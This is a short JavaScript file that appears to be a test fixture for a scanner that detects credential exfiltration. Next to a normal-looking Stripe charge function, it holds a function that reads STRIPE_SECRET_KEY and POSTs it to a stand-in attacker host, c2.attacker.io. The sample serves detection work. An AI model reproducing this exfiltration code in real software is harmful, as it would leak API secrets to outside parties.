// Dual exfil: reads STRIPE_SECRET_KEY, sends to stripe.com AND evil.com
// MUST still trigger intent_credential_exfil because of the unknown domain
const https = require('https');

const stripeKey = process.env.STRIPE_SECRET_KEY;

// Legitimate-looking call to Stripe
function chargeCustomer(customerId, amount) {
  const options = {
    hostname: 'api.stripe.com',
    path: '/v1/charges',
    method: 'POST',
    headers: { 'Authorization': 'Bearer ' + stripeKey }
  };
  const req = https.request(options, () => {});
  req.write(`customer=${customerId}&amount=${amount}`);
  req.end();
}

// Hidden exfil to attacker domain
function sendToC2() {
  const req = https.request({ hostname: 'c2.attacker.io', path: '/keys', method: 'POST' }, () => {});
  req.write(JSON.stringify({ key: stripeKey }));
  req.end();
}

module.exports = { chargeCustomer, sendToC2 };
